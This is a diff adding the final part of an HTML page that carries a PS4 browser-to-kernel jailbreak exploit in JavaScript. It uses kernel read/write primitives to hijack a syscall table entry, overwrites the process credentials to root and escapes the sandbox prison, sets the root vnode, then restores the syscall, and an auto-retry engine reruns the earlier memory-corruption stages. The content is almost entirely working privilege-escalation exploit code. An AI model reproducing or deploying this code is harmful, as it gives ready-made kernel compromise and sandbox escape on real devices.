+        var kbase = 0xffffffff80000000n;
+        mark("KERNEL-BASE", hex(kbase));
+
+        var sysent_661 = kbase + BigInt(sysent);
+        var jmp_rsi = kbase + BigInt(jmp);
+        mark("SYSENT-661", hex(sysent_661));
+        mark("JMP-RSI", hex(jmp_rsi));
+
+        var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
+        var sy_call = read64(sysent_661 + 8n);
+        var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);
+
+        write64(sysent_661, 2n);
+        write64(sysent_661 + 8n, jmp_rsi);
+        write64(sysent_661 + 0x2Cn, 1n);
+        mark("SYSENT-HIJACKED", "success");
+
+        var proc = kbase + BigInt(evf);
+        var sandboxEscaped = false;
+        var verifyUid = -1n;
+        var verifyGid = -1n;
+        var verifyPrison = -1n;
+        var dbgMode = Q.get("dbg") === "1";
+
+        function patchAndVerifyUcred(ucred, prisonVal) {
+            write64(ucred + 0x04n, 0n);
+            write64(ucred + 0x08n, 0n);
+            write64(ucred + 0x0Cn, 0n);
+            write64(ucred + 0x10n, 1n);
+            write64(ucred + 0x30n, prisonVal);
+            verifyUid = read64(ucred + 0x04n);
+            verifyGid = read64(ucred + 0x08n);
+            verifyPrison = read64(ucred + 0x30n);
+            return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonVal;
+        }
+
+        var prisonVal = read64(kbase + BigInt(prison0));
+        var hits = 0;
+        for (var i = 0; i < 0x4000; i += 8) {
+            try {
+                var candidate = read64(proc + BigInt(i));
+                if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
+                    hits++;
+                    var ucred = read64(proc + BigInt(i - 0x40));
+                    if (ucred > 0n && ucred < 0xffffffffffffn) {
+                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + i.toString(16) + "-ucred=" + hex(ucred));
+                        if (patchAndVerifyUcred(ucred, prisonVal)) {
+                            sandboxEscaped = true;
+                            mark("SANDBOX-ESCAPE", "success");
+                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
+                        }
+                        break;
+                    }
+                }
+            } catch(e) {}
+        }
+        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
+
+        if (!sandboxEscaped) {
+            var sigStart = proc - 0x4000n;
+            var sigEnd = proc + 0x4000n;
+            var sigFound = 0n;
+            for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
+                try {
+                    var ref = Number(read64(s) & 0xFFFFFFFFn);
+                    if (ref < 1 || ref > 0x200) continue;
+                    var ngroups = Number(read64(s + 0x10n) & 0xFFFFFFFFn);
+                    if (ngroups < 1 || ngroups > 0x80) continue;
+                    var pr = read64(s + 0x30n);
+                    if (pr !== prisonVal) continue;
+                    if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
+                    if (patchAndVerifyUcred(s, prisonVal)) {
+                        sandboxEscaped = true;
+                        sigFound = s;
+                        mark("UCRED-SIG-FOUND", hex(s));
+                        mark("SANDBOX-ESCAPE", "success");
+                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
+                    }
+                } catch(e) {}
+            }
+            if (!sandboxEscaped) {
+                mark("SANDBOX-ESCAPE", "FAILED-not-found");
+                if (dbgMode) {
+                    var dump = "";
+                    for (var d = 0; d < 0x100; d += 16) {
+                        var ln = hex(proc + BigInt(d)) + ": ";
+                        for (var c = 0; c < 16; c++) {
+                            var b = Number(read64(proc + BigInt(d + c)) & 0xFFn);
+                            ln += (b < 16 ? "0" : "") + b.toString(16);
+                        }
+                        dump += ln + "\n";
+                    }
+                    mark("PROC-DUMP", dump.trim());
+                }
+            }
+        }
+
+        var root = read64(kbase + BigInt(rootvnode));
+        var rootVerified = false;
+        if (root > 0n && root < 0xffffffffffffn) {
+            var fd = read64(proc + BigInt(0x48));
+            write64(fd + 0x10n, root);
+            write64(fd + 0x18n, root);
+            var fdCheck = read64(fd + 0x10n);
+            rootVerified = fdCheck === root;
+            mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
+            mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
+        } else {
+            mark("ROOT-VNODE-SET", "FAILED-invalid-root");
+        }
+
+        write64(sysent_661, BigInt(sy_narg));
+        write64(sysent_661 + 8n, sy_call);
+        write64(sysent_661 + 0x2Cn, BigInt(sy_thrcnt));
+        mark("SYSENT-RESTORED", "success");
+
+        mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);
+
+    } catch (error) {
+        mark("JAILBREAK-ERROR", error.message);
+    }
+}
+
+// ========== AUTO-RETRY ENGINE ==========
+var attemptSucceeded = false;
+
+function cleanupForRetry() {
+    try { history.replaceState(undefined, ""); } catch (_) {}
+    try { sessionStorage.removeItem(REVISION + ":blocked"); } catch (_) {}
+    try { sessionStorage.removeItem(REVISION + ":passed"); } catch (_) {}
+    getterCarrier = null;
+    preparedSymbolObject = null;
+    capturedString = null;
+    capturedWords = null;
+    fillerGraph = null;
+    outerGraph = null;
+    rwBuffer = null; rwView = null; rwMirror = null;
+    targetBuffer = null; targetView = null;
+    globalFakeArray = null;
+    referenceTarget = null;
+    lengthWord = null;
+    predecessorWords = null;
+    leakedScope = null;
+    for (var i = 0; i < keepAlive.length; i++) keepAlive[i] = null;
+    keepIndex = 0;
+    captureState = 0;
+    hostAddress = NaN; fakeAddress = NaN; targetAddress = NaN;
+    rwHeaderOK = false; targetHeaderOK = false;
+    readObserved = false; writeObserved = false; restoreObserved = false;
+    compositionState = 0;
+    retrySafe = false;
+}
+
+function scheduleRetry(reason) {
+    attemptSucceeded = false;
+    if (attemptNumber >= MAX_ATTEMPTS) {
+        mark("GIVE-UP", "all-" + MAX_ATTEMPTS + "-attempts-failed last=" + reason);
+        mark("ADVICE", "power-cycle-the-ps4-fresh-boot-then-one-clean-load");
+        return;
+    }
+    mark("RETRY", "reason=" + reason + "-next=" + (attemptNumber + 1) + "-of-" + MAX_ATTEMPTS);
+    setTimeout(runAttempt, 1500);
+}
+
+function runAttempt() {
+    attemptNumber++;
+    if (attemptNumber > 1) cleanupForRetry();
+    mark("ATTEMPT", attemptNumber + "-of-" + MAX_ATTEMPTS + "-n=" + DRAIN_COUNT);
+    try {
+        buildAndStoreGraph();
+        prepareAddrof();
+    } catch (error) {
+        mark("SETUP-THREW", (error && error.name) + ":" + String(error && error.message).slice(0, 80));
+        scheduleRetry("setup");
+    }
+}
+
+// ========== INIT ==========
+mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-attempts=" + MAX_ATTEMPTS);
+runAttempt();
+</script>
+</body>
+</html>
